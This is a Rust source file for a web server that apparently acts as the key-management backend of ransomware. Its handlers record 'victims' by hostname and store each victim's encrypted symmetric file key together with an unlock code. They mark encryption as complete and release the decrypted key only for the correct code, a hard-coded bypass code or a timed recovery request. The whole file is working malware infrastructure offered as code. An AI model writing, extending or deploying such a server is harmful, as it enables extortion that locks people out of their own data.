use std::sync::Arc;

use axum::extract::State;
use coconut_crab_lib::web::{
    codes::RECOVERY_REQUEST_CODE,
    responses::ServerResponse,
    structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
};
use purecrypto::ct::{Choice, ConstantTimeEq};
use tracing::{debug, error, info, warn};

use crate::{
    AppState, config,
    crypto::{decrypt_key, generate_code},
    extract::{ApiError, Validated},
    models::Victim,
    time::{epoch_time, is_recovery_valid},
};

#[tracing::instrument(skip_all, fields(id = %registration.id))]
pub async fn register(
    State(state): State<AppState>,
    Validated(registration): Validated<Registration>,
) -> Result<&'static str, ApiError> {
    let mut db = state.db.clone();
    let id = registration.id.as_str().to_owned();

    info!("Adding new victim");
    let inserted = Victim::upsert_by_id(&id)
        .on_create(|victim| {
            victim
                .hostname(registration.hostname.clone())
                .key(None::<String>)
                .code(None::<String>)
                .upload_time(None::<i64>)
                .complete(false)
        })
        .or_ignore()
        .exec(&mut db)
        .await;
    match inserted {
        Ok(Some(_)) => {
            debug!("Inserted new victim into database");
            Ok(ServerResponse::Success.as_str())
        }
        Ok(None) => {
            warn!("Existing victim found (duplicate key)");
            Err(ApiError::VictimExists)
        }
        Err(error) => {
            error!(error = ?error, "Failed to insert victim");
            Err(ApiError::Database)
        }
    }
}

fn db_lookup_error(action: &str, error: &toasty::Error) -> ApiError {
    if error.is_record_not_found() {
        warn!("Existing victim not found, cannot {action}");
        ApiError::VictimNotFound
    } else {
        error!(error = ?error, "Database error during {action}");
        ApiError::Database
    }
}

#[tracing::instrument(skip_all, fields(id = %upload_sym_key.id))]
pub async fn upload_sym_key(
    State(state): State<AppState>,
    Validated(upload_sym_key): Validated<UploadSymKey>,
) -> Result<&'static str, ApiError> {
    let mut db = state.db.clone();
    let id = upload_sym_key.id.as_str().to_owned();

    let mut victim = match Victim::get_by_id(&mut db, &id).await {
        Ok(victim) => victim,
        Err(error) => {
            return Err(db_lookup_error("upload symmetric key", &error));
        }
    };

    let code = generate_code();
    let Some(upload_time) = epoch_time() else {
        error!("Cannot determine current time");
        return Err(ApiError::TimeUnavailable);
    };

    if let Err(error) = toasty::update!(victim {
        key: Some(upload_sym_key.key.as_str().to_owned()),
        code: Some(code),
        upload_time: Some(upload_time),
    })
    .exec(&mut db)
    .await
    {
        error!(error = ?error, "Failed to update victim");
        return Err(ApiError::Database);
    }

    info!("Added symmetric key");
    info!("Added upload time: {upload_time}");

    Ok(ServerResponse::Success.as_str())
}

#[tracing::instrument(skip_all, fields(id = %announce_completion.id))]
pub async fn announce_completion(
    State(state): State<AppState>,
    Validated(announce_completion): Validated<AnnounceCompletion>,
) -> Result<&'static str, ApiError> {
    let mut db = state.db.clone();
    let id = announce_completion.id.as_str().to_owned();

    let mut victim = match Victim::get_by_id(&mut db, &id).await {
        Ok(victim) => victim,
        Err(error) => {
            return Err(db_lookup_error("announce completion", &error));
        }
    };

    info!("Designating as complete");
    if let Err(error) = toasty::update!(victim { complete: true })
        .exec(&mut db)
        .await
    {
        error!(error = ?error, "Failed to update victim completion");
        return Err(ApiError::Database);
    }

    Ok(ServerResponse::Success.as_str())
}

#[tracing::instrument(skip_all, fields(id = %download_sym_key.id))]
pub async fn download_sym_key(
    State(state): State<AppState>,
    Validated(download_sym_key): Validated<DownloadSymKey>,
) -> Result<String, ApiError> {
    let mut db = state.db.clone();
    let id = download_sym_key.id.as_str().to_owned();

    let existing_victim = match Victim::get_by_id(&mut db, &id).await {
        Ok(victim) => victim,
        Err(error) => {
            return Err(db_lookup_error("download symmetric key", &error));
        }
    };

    let recovery_valid =
        if !existing_victim.complete && download_sym_key.code.as_str() == RECOVERY_REQUEST_CODE {
            info!("Key recovery requested");
            let valid = is_recovery_valid(existing_victim.upload_time, existing_victim.complete);
            if valid {
                info!("Key recovery valid");
            } else {
                warn!("Key recovery not valid");
            }
            valid
        } else {
            false
        };

    let stored_code = existing_victim.code.as_deref().unwrap_or("");
    let authorized = stored_code
        .as_bytes()
        .ct_eq(download_sym_key.code.as_bytes())
        | config::BYPASS_CODE
            .as_bytes()
            .ct_eq(download_sym_key.code.as_bytes())
        | Choice::from(u8::from(recovery_valid));
    if bool::from(authorized) {
        info!("Correct code provided");
        info!("Providing decrypted key");
        let Some(stored_key) = existing_victim.key.as_deref() else {
            warn!("Victim has no uploaded key");
            return Err(ApiError::KeyNotUploaded);
        };
        let private_key = Arc::clone(&state.private_key);
        let stored_key = stored_key.to_owned();
        return match tokio::task::spawn_blocking(move || decrypt_key(&private_key, &stored_key))
            .await
        {
            Ok(Ok(key)) => Ok(key),
            Ok(Err(rejection)) => Err(rejection),
            Err(join_error) => {
                error!(error = ?join_error, "Decryption task failed");
                Err(ApiError::DecryptionFailed)
            }
        };
    }
    warn!("Incorrect code provided");
    Err(ApiError::UnauthorizedCode)
}
